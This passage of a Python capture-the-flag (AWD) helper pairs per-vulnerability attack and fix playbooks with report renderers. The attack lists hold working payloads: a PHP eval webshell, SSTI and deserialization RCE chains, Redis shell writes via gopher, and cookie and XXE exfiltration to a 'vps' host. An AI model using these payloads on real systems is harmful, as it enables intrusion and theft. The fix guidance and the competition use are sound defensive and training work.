        "attack": [
            "直接穿越：`?file=../../../../etc/passwd`、`?file=/flag`；Windows 试 `..\\..\\windows\\win.ini`。",
            "读源码：`php://filter/convert.base64-encode/resource=../config.php`。",
            "读配置拿数据库密码：`config.php` / `.env` / `application.yml` / `WEB-INF/web.xml` / `WEB-INF/classes/*.properties`。",
            "`/proc/self/environ`、`/proc/self/cmdline` 能拿到环境变量（flag 有时在 env 里）。",
            "拿到数据库密码后直连 `mysql -h127.0.0.1 -uroot -p`，`select * from flag`。",
        ],
        "fix": [
            "同 LFI：**白名单文件名**，不要拼接路径。`$allow=['a.pdf','b.xlsx']; if(!in_array($n,$allow)) die;`",
            "动态场景用 `basename()` + 固定目录 + `realpath` 前缀校验，三件套缺一不可。",
            "拒绝绝对路径和协议：`preg_match('#^[a-z]+://#i',$n)` 或含 `..`、`/`、`\\`、`%00` 直接拒绝。",
            "下载目录要放在 web 根之外，用后端 `readfile` + 鉴权下发，而不是直接给静态 URL。",
            "**别改坏功能**：保留原有子目录结构的话，把 `realpath` 校验的基准目录设成该子目录。",
        ],
    },
    {
        "key": "upload", "label": "文件上传",
        "kw": ["upload", "上传", "move_uploaded_file", "_files", "multipart", "filename", "content-type"],
        "attack": [
            "先看后缀黑名单：`.php` 被拦就试 `.php5 .phtml .pht .phar .php. .php%00.jpg .php::$DATA`。",
            "看是否只校验 Content-Type：抓包把 `image/jpeg` 改成 `application/x-php` 但文件名保持 `.php`。",
            "图片马 + 包含：传 `.jpg` 图片马，再配合 LFI `?page=uploads/x.jpg` 执行；或 `.htaccess` 让 jpg 当 php 解析。",
            "`.user.ini` + `auto_prepend_file=x.jpg`（PHP-FPM 场景）——上传 `.user.ini` 再传图片马，全站自动包含。",
            "看是否有二次渲染：若是头像类，用 GIF89a 头 + 注释段塞 payload，或改 EXIF 字段。",
            "上传目录可执行判断：直接访问 `/uploads/x.php`，200 且有回显说明能解析。",
        ],
        "fix": [
            "**不要用黑名单**，用白名单后缀 + 服务端真实 MIME 检测："
            "`$ext=strtolower(pathinfo($name,PATHINFO_EXTENSION)); if(!in_array($ext,['jpg','png','gif'])) die;` "
            "再加 `getimagesize()` / `finfo_file()` 校验。",
            "**重命名文件**：`$new=bin2hex(random_bytes(8)).'.'.$ext;`，彻底断掉用户控制文件名的能力。",
            "上传目录**禁止执行**：Nginx `location ^~ /uploads/ { location ~ \\.php$ { deny all; } }`；"
            "Apache 在目录放 `.htaccess`：`php_flag engine off`。",
            "目录外存储 + 鉴权下发，或存对象存储，是最彻底的做法。",
            "**别改坏功能**：业务需要保留原文件名展示时，数据库存原名、磁盘存随机名，下载时再映射。",
        ],
    },
    {
        "key": "filewrite", "label": "任意文件写入",
        "kw": ["file_put_contents", "fwrite(", "fputs(", "写入", "save", "缓存", "log"],
        "attack": [
            "写入 web 目录拿 shell：`?c=<?php eval($_POST[1]);?>&f=shell.php`。",
            "写 `.htaccess` / `.user.ini` 改变解析规则，再配合图片马。",
            "写 crontab：`/var/spool/cron/root`（需 root）或 `~/.ssh/authorized_keys`。",
            "写日志投毒：把 payload 写进 access.log，再用 LFI 包含。",
            "覆盖配置文件让站点连到自己的数据库（打点+钓鱼）。",
        ],
        "fix": [
            "文件名和路径必须由服务端决定，用户只提供「内容」或「ID」。",
            "白名单后缀 + `basename()` + `realpath` 前缀校验，三件套同文件读取。",
            "写入目录设 `noexec`/禁止解析，且不要放在 web 根下。",
            "内容做转义：如果写的是模板/配置，用 `var_export()` 生成 PHP 值，不要直接拼字符串。",
            "**别改坏功能**：缓存/日志类功能保留，只把路径改成固定目录 + 固定文件名。",
        ],
    },
    {
        "key": "deser", "label": "反序列化",
        "kw": ["unserialize", "readobject", "objectinputstream", "yaml.load", "pickle.load",
               "反序列化", "serialize", "marshal", "json.parse.*reviver"],
        "attack": [
            "先确认可控点：Cookie / 参数里出现 `O:4:\"User\":...`（PHP）或 `rO0AB...`（Java base64）。",
            "PHP：找 `__destruct` / `__wakeup` / `__toString` 里的危险调用，串成 POP 链；"
            "常见终点 `system` / `file_put_contents` / `call_user_func`。",
            "Java：用 ysoserial 生成链（CommonsCollections / URLDNS 先探点），"
            "`java -jar ysoserial.jar CommonsCollections5 'id' | base64`。",
            "Python pickle：`__reduce__` 返回 `(os.system,('id',))`，base64 后塞进去。",
            "无回显用 DNSLog 或写文件；有 `phar://` 入口时不需要 unserialize 函数，`file_exists('phar://x.phar')` 就触发。",
        ],
        "fix": [
            "**不要反序列化不可信数据**。会话/缓存改用 `json_encode/json_decode`（无对象注入）。",
            "必须用时加签名：`hash_hmac('sha256',$data,$key)` 校验通过才 unserialize，key 在服务端。",
            "Java 侧用 `ObjectInputFilter` 白名单类，或升级有黑名单的 JDK。",
            "PHP 7+ 用 `unserialize($s,['allowed_classes'=>['SafeClass']])` 限制可实例化类。",
            "**别改坏功能**：老数据兼容时，先按新格式解析，失败再走签名校验的旧格式。",
        ],
    },
    {
        "key": "ssrf", "label": "SSRF",
        "kw": ["curl_exec", "file_get_contents.*http", "fsockopen", "requests.get", "urllib",
               "ssrf", "url=", "fetch(", "http://.*\\$"],
        "attack": [
            "先探内网：`?url=http://127.0.0.1:80`、`http://169.254.169.254/latest/meta-data/`（云元数据）。",
            "绕 localhost 过滤：`127.0.0.1` 变形 `0x7f000001`、`2130706433`、`127.1`、`[::1]`、`127.0.0.1.nip.io`。",
            "用 `file://` / `gopher://` / `dict://` 扩展能力：`file:///flag` 直接读文件；"
            "`gopher://127.0.0.1:6379/_...` 打 Redis 写 shell。",
            "内网横向：扫 `192.168.x.x:22/3306/6379/9200`，Redis 未授权直接 `config set dir` 写 crontab。",
            "302 绕过：自己的 vps 返回 `Location: http://127.0.0.1/`，很多实现只校验第一次 URL。",
        ],
        "fix": [
            "**白名单域名**是唯一可靠方案：解析后比对 `in_array(parse_url($u,PHP_URL_HOST),$allow)`。",
            "必须开放时做「解析后 IP 校验」：`gethostbyname` → 拒绝私有网段 "
            "`10./172.16-31./192.168./127./169.254./0.` 和 IPv6 回环，**并且禁用 302 跟随**（`CURLOPT_FOLLOWLOCATION=0`）。",
            "限制协议：只允许 `http/https`，显式拒绝 `file/gopher/dict/ftp/ldap`。",
            "用独立出口网络/代理，把 SSRF 的横向能力限制住（架构层兜底）。",
            "**别改坏功能**：如果业务就是「抓取任意网页」，至少加协议白名单 + 禁止内网 + 超时 + 响应大小上限。",
        ],
    },
    {
        "key": "xss", "label": "XSS",
        "kw": ["xss", "跨站", "innerhtml", "document.write", "echo.*\\$_get", "echo.*\\$_post",
               "print.*\\$_", "<script", "onerror"],
        "attack": [
            "反射型：`?q=<script>alert(1)</script>`，被转义就试 `<img src=x onerror=alert(1)>`、"
            "`<svg/onload=alert(1)>`、`<details open ontoggle=alert(1)>`。",
            "属性内注入：`\" onmouseover=\"alert(1)` 或 `' autofocus onfocus='alert(1)`。",
            "JS 上下文：`</script><script>alert(1)</script>` 或 `';alert(1);//`。",
            "AWD 里 XSS 主要用来偷 admin cookie：`<script>new Image().src='http://vps/?c='+document.cookie</script>`，"
            "配合后台 bot 触发。",
            "过滤了 `<` `>` 就试 HTML 实体绕过、`<scr<script>ipt>`、大小写混写。",
        ],
        "fix": [
            "**输出时转义**，不是输入时过滤：PHP `htmlspecialchars($s,ENT_QUOTES,'UTF-8')`，"
            "JS 用 `textContent` 而不是 `innerHTML`。",
            "区分上下文：HTML 正文用 `htmlspecialchars`；属性用引号包裹 + 转义；"
            "JS 字符串用 `json_encode`；URL 用 `urlencode`。",
            "富文本必须用成熟的白名单净化库（HTMLPurifier / DOMPurify），不要自己写正则。",
            "加 `Content-Security-Policy` 和 `HttpOnly` Cookie 兜底（`Set-Cookie: ...; HttpOnly; SameSite=Lax`）。",
            "**别改坏功能**：保留原有富文本标签，用白名单净化而不是全转义。",
        ],
    },
    {
        "key": "xxe", "label": "XXE",
        "kw": ["xxe", "simplexml_load", "domdocument", "xmlreader", "saxparser", "xml 实体",
               "doctype", "documentbuilder"],
        "attack": [
            "经典读文件：`<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"file:///flag\">]><r>&x;</r>`。",
            "无回显就外带：`<!ENTITY % p SYSTEM \"http://vps/x.dtd\"> %p;`，dtd 里再 `<!ENTITY x SYSTEM \"file:///flag\">`。",
            "打内网：`SYSTEM \"http://127.0.0.1:6379/\"` 或 `gopher://` 组合。",
            "PHP 下 `expect://id`（装了 expect 扩展）可直接命令执行。",
            "盲 XXE 用参数实体 + OOB，或利用报错信息带出（error-based）。",
        ],
        "fix": [
            "**禁用外部实体**（各语言写法不同，必须逐个确认）："
            "PHP `libxml_disable_entity_loader(true)`（PHP8 默认已禁用）；"
            "Java `factory.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\",true)`。",
            "Java 还要设 `XMLConstants.FEATURE_SECURE_PROCESSING=true`、"
            "`setFeature(\"http://xml.org/sax/features/external-general-entities\",false)` 和 external-parameter-entities。",
            "Python `lxml` 用 `XMLParser(resolve_entities=False)`；`defusedxml` 直接替换标准库。",
            "能不用 XML 就换 JSON。",
            "**别改坏功能**：如果业务 XML 真需要 DTD，改成预定义白名单 DTD，不允许外部 SYSTEM。",
        ],
    },
    {
        "key": "ssti", "label": "模板注入（SSTI）",
        "kw": ["ssti", "template.*render", "twig", "freemarker", "velocity", "jinja", "smarty",
               "thymeleaf", "{{"],
        "attack": [
            "先探：`{{7*7}}` → 49（Twig/Jinja）、`${7*7}`（Freemarker/JSP EL）、`#{7*7}`（Ruby）。",
            "Twig：`{{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"id\")}}`。",
            "Jinja2：`{{config.__class__.__init__.__globals__['os'].popen('id').read()}}`。",
            "Freemarker：`<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}`。",
            "无回显就用 `?new()` 写文件，或 DNSLog 带外。",
        ],
        "fix": [
            "**不要把用户输入当模板**：模板字符串固定，用户输入只作为变量传入 "
            "`render('page.html',['name'=>$name])`。",
            "必须动态模板时用沙箱：Twig `SandboxExtension`、Jinja2 `SandboxedEnvironment`。",
            "Java 侧避免 `TemplateEngine.process(userInput, ...)`，改为从固定模板名白名单里选。",
            "**别改坏功能**：邮件/通知模板这类需要用户可编辑的，用受限语法（只允许变量替换），不要开放函数调用。",
        ],
    },
    {
        "key": "authz", "label": "越权 / 鉴权缺失（IDOR）",
        "kw": ["idor", "越权", "auth", "permission", "role", "admin", "鉴权", "未授权", "登录"],
        "attack": [
            "改 ID 试：`?id=1` → `?id=2`，看能否读到别人的订单/资料/文件。",
            "删掉 Cookie / Token 再请求，接口是否仍返回数据（未授权访问）。",
            "普通用户 token 直接打管理接口 `/api/admin/...`，看是否只在前端隐藏了菜单。",
            "改请求体里的 `user_id` / `role` / `is_admin`（mass assignment），服务端是否直接信任。",
            "AWD 里重点看：`/admin`、`/api/user/list`、`/download?id=`、密码重置接口。",
        ],
        "fix": [
            "**每个对象级操作都要校验归属**：`if($row['user_id'] != $_SESSION['uid']) die('403');`，"
            "不要只校验「已登录」。",
            "鉴权做成中间件/拦截器统一处理，避免每个接口各写一遍（漏一个就是洞）。",
            "请求体里的 `role` / `is_admin` / `user_id` 一律服务端覆盖，不采信客户端。",
            "管理接口单独前缀 + 独立鉴权，不依赖前端隐藏。",
            "**别改坏功能**：管理员需要跨用户操作时，按角色放行而不是取消校验。",
        ],
    },
    {
        "key": "traversal", "label": "目录遍历",
        "kw": ["traversal", "遍历", "\\.\\./", "path", "dir", "目录"],
        "attack": [
            "`?path=../../../../etc/passwd`，编码绕过 `%2e%2e%2f`、`..%252f`、`....//`。",
            "Windows：`..\\..\\..\\windows\\win.ini`、`..%5c`。",
            "列目录：`?dir=../` 看能否列出上级目录结构。",
            "配合文件下载接口直接读源码/配置。",
        ],
        "fix": [
            "`basename()` 去掉目录 + `realpath` 前缀校验，双保险。",
            "过滤时**解码后再判断**（先 `urldecode` 再查 `..`），否则 `%2e%2e` 能绕。",
            "拒绝绝对路径、盘符、`\\`、`%00`。",
            "**别改坏功能**：需要子目录浏览时，用 `scandir` 列出白名单目录内的条目，不接受外部路径。",
        ],
    },
    {
        "key": "cred", "label": "弱口令 / 硬编码凭证",
        "kw": ["password", "密码", "secret", "hardcode", "硬编码", "key", "token", "admin123",
               "root:", "credential"],
        "attack": [
            "源码里搜 `password` / `secret` / `key` / `root`，常有数据库账号、JWT secret、API key。",
            "拿到 JWT secret 直接伪造管理员 token（`alg:HS256`，`{\"role\":\"admin\"}`）。",
            "拿到数据库密码直连读 flag。",
            "默认口令表：`admin/admin`、`admin/admin123`、`root/root`、`test/test`。",
            "`.env` / `config.php` / `application.yml` / `docker-compose.yml` 是重灾区。",
        ],
        "fix": [
            "密钥移到环境变量，代码里不留明文：`getenv('DB_PASS')`。",
            "**改了密钥要同步改所有依赖方**（JWT secret 一改，所有已签发 token 失效）。",
            "默认口令必须强制首次登录修改，且服务端校验。",
            "把 `.env`、`config.php` 加到 `.gitignore`，并检查历史提交。",
            "**别改坏功能**：改密钥前先确认没有硬编码在其它文件（grep 全项目）。",
        ],
    },
    {
        "key": "logic", "label": "逻辑漏洞（验证码/重置/支付）",
        "kw": ["验证码", "captcha", "reset", "重置", "找回", "支付", "price", "amount",
               "sign", "签名", "优惠", "积分"],
        "attack": [
            "验证码回显：响应体里带 `code` / `captcha` 字段，或前端 JS 里有。",
            "验证码可爆破：4 位数字且无次数限制，直接跑 10000 次。",
            "重置密码改手机号/邮箱参数：`?phone=自己的` → `?phone=admin的`，验证码发到自己手机。",
            "响应里带 `reset_token` 或 `step` 字段，直接跳到第三步改密。",
            "支付改价：`price=0.01`、`amount=-1`、`quantity=0`；签名校验是否覆盖全部字段。",
        ],
        "fix": [
            "验证码与手机号/邮箱**绑定存储**，校验时同时比对，不能只校验码。",
            "验证码一次性 + 5 分钟过期 + 同 IP/账号限频（`redis incr` + `expire`）。",
            "重置流程用服务端 session 记录状态机，不允许客户端传 `step`。",
            "金额、角色、状态一律服务端计算，不采信客户端。",
            "**别改坏功能**：限频阈值要留足正常用户余量（如 5 次/分钟）。",
        ],
    },
    {
        "key": "infoleak", "label": "信息泄露",
        "kw": ["phpinfo", "debug", "泄露", "backup", "备份", "\\.git", "\\.svn", "error",
               "stack trace", "traceback"],
        "attack": [
            "`/phpinfo.php`、`/info.php`、`/test.php`、`/.git/config`、`/www.zip`、`/backup.sql`。",
            "报错页带路径和 SQL，直接拿到表结构。",
            "`.git` 泄露用 `GitHack` 还原源码。",
            "`/.env`、`/config.php.bak`、`/index.php~`。",
            "`/actuator/env`、`/actuator/heapdump`（Spring Boot）能拿密钥。",
        ],
        "fix": [
            "生产环境 `display_errors=Off`、`APP_DEBUG=false`，错误统一走日志。",
            "删除 `phpinfo` / 测试文件 / 备份文件，web 根下不放 `.git`、`.svn`、`.env`。",
            "Nginx 加 `location ~ /\\.(git|svn|env) { deny all; }`。",
            "**别改坏功能**：调试开关用环境变量控制，本地开发仍可开。",
        ],
    },
    {
        "key": "crypto", "label": "不安全加密 / 随机",
        "kw": ["md5(", "sha1(", "rand(", "mt_rand", "random", "加密", "ecb", "des", "弱加密"],
        "attack": [
            "`md5($pass)` 无盐 → 彩虹表/在线解密直接出明文。",
            "`mt_rand()` 可预测：拿到几个输出就能还原种子（php_mt_seed）。",
            "ECB 模式：相同明文块产生相同密文块，可做块重排/字节翻转攻击。",
            "`==` 松散比较 + `0e` 开头 md5（魔法哈希）：`md5('240610708')` 与 `md5('QNKCDZO')` 都为 `0e...`。",
            "时序攻击：`==` 比较 token 可逐字节爆破。",
        ],
        "fix": [
            "密码用 `password_hash($p,PASSWORD_DEFAULT)` + `password_verify`，不要 md5/sha1。",
            "随机数用 `random_bytes()` / `random_int()`，不要 `rand`/`mt_rand`。",
            "对称加密用 AES-GCM（带认证），不要 ECB/DES。",
            "比较敏感值用 `hash_equals()`（防时序）。",
            "**别改坏功能**：老密码迁移用「登录时校验旧哈希，成功后重新 hash 存新格式」。",
        ],
    },
]

_PLAYBOOK_FALLBACK = {
    "key": "other", "label": "其他 / 需人工确认",
    "attack": [
        "先确认这个点是否真的可达：请求参数能不能到危险函数、有没有前置鉴权。",
        "按数据流追：入口参数 → 中间处理（过滤/拼接）→ 危险函数，缺一环就是误报。",
        "AWD 里优先看能直接读 `/flag` 或写文件的点，其次是能拿数据库权限的点。",
    ],
    "fix": [
        "先定位根因（哪个变量没校验），再决定最小改动方案，不要直接删功能。",
        "统一用「白名单 + 类型转换 + 输出转义」三件套。",
        "改完回归验证：原有正常请求仍返回 200 且业务数据正确。",
    ],
}


# 中文名容易一词多义（「命令注入」不是 SQL 注入），这几条优先判定
_FORCE_RULES = (
    (("命令注入", "command injection", "os command", "命令执行"), "rce"),
    (("代码注入", "code injection", "代码执行"), "code_exec"),
    (("sql", "sqli", "sql injection", "sql 注入"), "sqli"),
    (("文件包含", "file inclusion", "lfi", "rfi"), "lfi"),
    (("文件上传", "file upload", "unrestricted upload"), "upload"),
    (("反序列化", "deserial"), "deser"),
    (("ssrf", "服务端请求伪造"), "ssrf"),
    (("xxe", "xml 外部实体"), "xxe"),
    (("ssti", "模板注入"), "ssti"),
    (("xss", "跨站脚本"), "xss"),
    (("越权", "idor", "broken access", "未授权"), "authz"),
    (("弱口令", "弱密码", "hardcode", "硬编码"), "cred"),
    (("目录遍历", "path traversal", "directory traversal"), "traversal"),
    (("信息泄露", "information disclosure", "phpinfo", "debug"), "infoleak"),
    (("弱加密", "weak hash", "insecure random", "md5"), "crypto"),
    (("验证码", "密码重置", "逻辑漏洞", "business logic"), "logic"),
    (("任意文件读取", "任意文件下载", "file read", "file download"), "fileread"),
    (("任意文件写入", "file write"), "filewrite"),
)


def _playbook_for(finding: dict) -> dict:
    """按 name / cat / code 加权匹配攻防手册；中文歧义词走 _FORCE_RULES 优先判定。"""
    name = str(finding.get("name") or "").lower()
    cat = str(finding.get("cat") or "").lower()
    body = " ".join(str(finding.get(k) or "") for k in ("code", "source")).lower()
    hay = name + " " + cat

    for words, key in _FORCE_RULES:
        if any(w in hay for w in words):
            for pb in VULN_PLAYBOOK:
                if pb["key"] == key:
                    return pb
    # 名称/类别没命中时，再看代码片段（如 md5( 出现在代码里）
    for words, key in _FORCE_RULES:
        if any(w in body for w in words):
            for pb in VULN_PLAYBOOK:
                if pb["key"] == key:
                    return pb

    best, best_score = None, 0
    for pb in VULN_PLAYBOOK:
        score = 0
        for k in pb["kw"]:
            if k in name:
                score += 3
            elif k in cat:
                score += 4
            elif k in body:
                score += 1
        if score > best_score:
            best, best_score = pb, score
    return best or _PLAYBOOK_FALLBACK


def _playbook_block(finding: dict, indent: str = "") -> list[str]:
    pb = _playbook_for(finding)
    L = ["%s#### ⚔️ 攻击思路（%s）" % (indent, pb["label"]), ""]
    for i, s in enumerate(pb["attack"], 1):
        L.append("%s%d. %s" % (indent, i, s))
    L.append("")
    L.append("%s#### 🛡️ 修复思路（%s）" % (indent, pb["label"]))
    L.append("")
    for i, s in enumerate(pb["fix"], 1):
        L.append("%s%d. %s" % (indent, i, s))
    L.append("")
    return L


def _sev_rank(f: dict) -> int:
    return {"critical": 0, "high": 1, "medium": 2, "low": 3}.get(f.get("sev"), 4)


def _render_attack_plan(meta: dict, findings: list) -> str:
    """attack-plan.md：按可利用性排序的攻击路线，break 场景直接用。"""
    L = ["# %s · 攻击思路（AWDP Break）" % meta["name"], ""]
    L.append("- 生成时间：%s" % meta["created_at"])
    L.append("- 本地链接：%s" % meta["url"])
    L.append("- 源码：`%s/src`" % meta["dir"])
    L.append("")
    L.append("> 每条都是「从哪个入口进 → 打什么 payload → 看什么回显 → flag 在哪」。")
    L.append("> 按严重级别排序，先打前 3 条；打完再看下一批。")
    L.append("")

    ordered = sorted(findings, key=_sev_rank)
    if not ordered:
        L.append("_扫描器没报出问题。手工看这几个方向：_")
        L.append("")
        L.append("1. 所有接收 `$_GET` / `$_POST` / `$_REQUEST` 的文件，追到 `system` / `include` / `query`；")
        L.append("2. 上传接口 + 上传目录是否可解析；")
        L.append("3. 登录/重置密码逻辑；")
        L.append("4. `/admin` 类接口是否只在前端隐藏。")
        L.append("")
        return "\n".join(L)

    L.append("## 一、最快拿分路径")
    L.append("")
    for i, f in enumerate(ordered[:3], 1):
        pb = _playbook_for(f)
        L.append("%d. **[%s] %s — `%s:%d`**（%s）" % (
            i, f["sev"].upper(), f["name"], f["file"], f["line"], pb["label"]))
        L.append("   - 第一发：%s" % pb["attack"][0])
    L.append("")
    L.append("## 二、逐条攻击路线")
    L.append("")
    for i, f in enumerate(ordered, 1):
        L.append("### %d. [%s] %s — `%s:%d`" % (i, f["sev"].upper(), f["name"], f["file"], f["line"]))
        L.append("")
        L.append("- 类型：%s" % f["cat"])
        if f["source"]:
            L.append("- 污点来源：%s" % f["source"])
        if f["code"]:
            L.append("")
            L.append("```")
            L.append(f["code"][:600])
            L.append("```")
        L.append("")
        L += _playbook_block(f)
    return "\n".join(L)


def _render_fix_plan(meta: dict, findings: list) -> str:
    """fix-plan.md：按优先级排的修复清单，fix 场景直接用。"""
    L = ["# %s · 修复思路（AWDP Fix）" % meta["name"], ""]
    L.append("- 生成时间：%s" % meta["created_at"])
    L.append("- 本地链接：%s" % meta["url"])
    L.append("- 源码：`%s/src`" % meta["dir"])
    L.append("")
    L.append("> 每条都是「根因在哪 → 怎么最小改动 → 改完怎么验证」。")
    L.append("> 先按第一节止血，再逐条精修；改完务必回归原有功能。")
    L.append("")

    ordered = sorted(findings, key=_sev_rank)
    if not ordered:
        L.append("_扫描器没报出问题，但仍建议自查：_")
        L.append("")
        L.append("1. 全项目 grep 危险函数：`system|exec|eval|assert|include|unserialize|file_put_contents`；")
        L.append("2. 所有 SQL 拼接点改预处理；")
        L.append("3. 上传目录禁止解析；")
        L.append("4. 关掉 debug/报错回显。")
        L.append("")
        return "\n".join(L)

    L.append("## 一、5 分钟止血清单")
    L.append("")
    seen = set()
    n = 0
    for f in ordered:
        pb = _playbook_for(f)
        if pb["key"] in seen:
            continue
        seen.add(pb["key"])
        n += 1
        L.append("%d. **%s**（影响 %d 处）→ %s" % (
            n, pb["label"], sum(1 for x in ordered if _playbook_for(x)["key"] == pb["key"]),
            pb["fix"][0]))
        if n >= 6:
            break
    L.append("")
    L.append("## 二、逐条修复方案")
    L.append("")
    for i, f in enumerate(ordered, 1):
        L.append("### %d. [%s] %s — `%s:%d`" % (i, f["sev"].upper(), f["name"], f["file"], f["line"]))
        L.append("")
        L.append("- 类型：%s" % f["cat"])
        if f["sanitized"]:
            L.append("- 注意：疑似已做过滤，**先确认是否可绕过再改**（可能是误报）")
        if f["code"]:
            L.append("")
            L.append("```")
            L.append(f["code"][:600])
            L.append("```")
        L.append("")
        if f["fix"]:
            L.append("- 扫描器建议：%s" % f["fix"])
            L.append("")
        L += _playbook_block(f)
    return "\n".join(L)


def _render_bundle_md(meta: dict, files: list, findings: list) -> str:
    L: list[str] = []
    L.append("# %s · AWDP 修复包" % meta["name"])
    L.append("")
    L.append("- 生成时间：%s" % meta["created_at"])
    L.append("- 场景：AWDP %s" % meta["scan_type"])
    L.append("- 引擎：%s" % meta["engine"])
    L.append("- 源码文件：%d 个（跳过 %d 个非源码/依赖/超大文件）" % (meta["file_count"], meta["skipped"]))
    L.append("- 扫描问题：%d 条（严重 %d / 高危 %d / 中危 %d / 低危 %d）" %
             (meta["finding_count"], meta["by_sev"]["critical"], meta["by_sev"]["high"],
              meta["by_sev"]["medium"], meta["by_sev"]["low"]))
    L.append("- 本地链接：%s" % meta["url"])
    L.append("- 攻击路线：%sattack-plan.md" % meta["url"])
    L.append("- 修复清单：%sfix-plan.md" % meta["url"])
    L.append("- 本地 AI 任务书：%slocal-ai.md（直接整篇复制给本地 AI）" % meta["url"])
    L.append("- 磁盘目录：`%s`" % meta["dir"])
    L.append("")
    L.append("## 一、任务说明")
    L.append("")
    L.append("这是 AWD **%s** 场景的代码包，上面是扫描器报出的问题清单，下面是全部源码。" %
             ("Break（攻击/挖洞）" if meta["scan_type"] == "break" else "Fix（防守/修复）"))
    L.append("请帮我：")
    L.append("")
    L.append("1. 逐条复核问题清单，标出**误报**（说明原因）和**真漏洞**；")
    L.append("2. 对真漏洞给出**最小改动的修复代码**（保持原有功能与接口不变，不要重写整个文件）；")
    L.append("3. 找出扫描器**漏掉**的同类漏洞（同文件的其它入口、其它参数、其它 include/路由）；")
    L.append("4. 输出格式：`文件:行 → 问题 → 修复后代码片段 → 一句话说明`。")
    L.append("")
    L.append("## 二、文件树")
    L.append("")
    L.append("```")
    L.extend(meta["tree"])
    L.append("```")
    L.append("")
    L.append("## 三、问题清单（%d）" % len(findings))
    L.append("")
    if not findings:
        L.append("_扫描器没有报出问题（不代表没有漏洞，请人工复核危险函数）。_")
        L.append("")
    for i, f in enumerate(findings, 1):
        L.append("### %d. [%s] %s — `%s:%d`" % (i, f["sev"].upper(), f["name"], f["file"], f["line"]))
        L.append("")
        L.append("- 类型：%s" % f["cat"])
        if f["source"]:
            L.append("- 污点来源：%s" % f["source"])
        if f["sanitized"]:
            L.append("- 备注：疑似已做过滤（可能是误报）")
        if f["code"]:
            L.append("")
            L.append("```")
            L.append(f["code"][:600])
            L.append("```")
        if f["fix"]:
            L.append("")
            L.append("- 建议：%s" % f["fix"])
        L.append("")
        L += _playbook_block(f)
    L.append("## 四、源码（%d 个文件）" % len(files))
    L.append("")
    for path, text, truncated in files:
        L.append("### `%s`%s" % (path, "（已截断）" if truncated else ""))
        L.append("")
        L.append("```" + _lang_hint(path))
        L.append(text)
        L.append("```")
        L.append("")
    return "\n".join(L)


def _lang_hint(path: str) -> str:
    ext = os.path.splitext(path)[1].lower().lstrip(".")
    return {"php3": "php", "php4": "php", "php5": "php", "phtml": "php", "inc": "php",
            "jsx": "jsx", "tsx": "tsx", "htm": "html", "yml": "yaml"}.get(ext, ext)


_LANG_NAME = {
    "php": "PHP", "phtml": "PHP", "inc": "PHP", "java": "Java/JSP", "jsp": "Java/JSP",
    "go": "Go", "py": "Python", "rb": "Ruby", "js": "Node.js", "ts": "Node.js",
    "aspx": "ASP.NET", "asp": "ASP", "cs": "C#", "vue": "前端", "html": "前端",
}


def _lang_desc(exts: list) -> str:
    names: list[str] = []
    for e in exts:
        nm = _LANG_NAME.get(e)
        if nm and nm not in names:
            names.append(nm)
    if not names:
        return "多语言 Web"
    return " / ".join(names[:4]) + (" 等" if len(names) > 4 else "") + " Web"


def _render_local_ai_md(meta: dict, findings: list) -> str:
    """local-ai.md：整篇直接丢给本地 AI 的任务书。

    设计原则（都是踩坑换来的）：
    - 第一屏就写清「不写文件 = 交白卷」，因为本地 AI 最爱在聊天里贴代码；
    - 给误报判定标准，否则它会去改常量路径这类误报，白做还改坏功能；
    - 给 check_fixed.py 当验收门，让它自己知道过没过，不用人来发现。
    """
    d = meta["dir"]
    all_f = findings
    L = [
        "# 给本地 AI 的任务书",
        "",
        "> 用法：把本文件**全文**复制给本地 AI（Cursor / Claude Desktop / Copilot / Ollama / LM Studio）。",
        "> 它有文件读写权限，所以**不要**在聊天里贴代码 —— 直接写文件。",
        "",
        "## 目标（一句话）",
        "",
        "把 `src/` 里的漏洞修好，把改过的**完整文件**写到 `fixed/`，然后让 `check_fixed.py` 全绿。",
        "",
        "## 三条铁律",
        "",
        "1. **不写文件 = 交白卷。** 在聊天里贴的代码会被直接丢弃，`fixed/` 里有文件才算数。",
        "2. **误报不要改。** 判断为误报的，只在 `NOTES.md` 里写理由，不要动 `fixed/`。改误报会白做还改坏功能。",
        "3. **不跑 `check_fixed.py` 不算完成。** 全绿才叫修完。",
        "",
        "## 环境",
        "",
        "- 会话目录：`%s`" % d,
        "- 原始源码：`%s/src`" % d,
        "- 改好的文件写这里：`%s/fixed/`（结构与 `src/` 完全一致）" % d,
        "- 扫描全文：`%sbundle.md`" % meta["url"],
        "- 修复清单：`%sfix-plan.md`" % meta["url"],
        "- 攻击路线（判断能不能真打通）：`%sattack-plan.md`" % meta["url"],
        "- 结构化结果：`%sfindings.json`" % meta["url"],
        "",
        "**先 `cd %s` 再 `pwd` 确认**，别在别的会话目录里干活（目录名很像，改错包等于没改）。" % d,
        "",
        "项目 %d 个源码文件，扫描器报出 %d 条问题（严重 %d / 高危 %d / 中危 %d / 低危 %d）。" %
        (meta["file_count"], meta["finding_count"], meta["by_sev"]["critical"],
         meta["by_sev"]["high"], meta["by_sev"]["medium"], meta["by_sev"]["low"]),
        "",
        "## 全部 %d 条（一条都不能跳过）" % len(all_f),
        "",
        "| # | 级别 | 问题 | 位置 |",
        "|---|---|---|---|",
    ]
    for i, f in enumerate(all_f, 1):
        L.append("| %d | %s | %s | `%s:%d` |" % (
            i, f["sev"].upper(), f["name"], f["file"], f["line"]))
    L += [
        "",
        "> 低危也要修。AWD 里 `uniqid()` / `rand()` 这类可预测 ID 会被对面直接枚举，",
        "> 不是「只是展示用」就放过。",
        "",
        "## 第一步：判定真 / 误报（写进 NOTES.md，不改代码）",
        "",
        "判**误报**（满足任一即可，且必须写明是哪一条）：",
        "",
        "- 汇点的路径/参数**不是用户可控**：常量、配置项、构造函数里写死的值；",
        "- `extract()` 的数组是**字面量**且键名与已有变量同名（等价 no-op，删掉也行）；",
        "- 值来自**固定白名单查表**，例如 `$mimeTypes[$ext] ?? 'application/octet-stream'`；",
        "- 输出已经过 `htmlspecialchars()` / `JSON_HEX_*` / 参数化查询等转义。",
        "",
        "判**真漏洞**（必须同时满足）：",
        "",
        "- 污点源可控：`$_GET` / `$_POST` / `$_COOKIE` / `$_REQUEST` / `REQUEST_URI` / 上传的文件名与内容 / HTTP 头；",
        "- 能到达危险汇点：`file_put_contents` / `readfile` / `include` / `unserialize` / `header` / SQL / `eval` / `system`；",
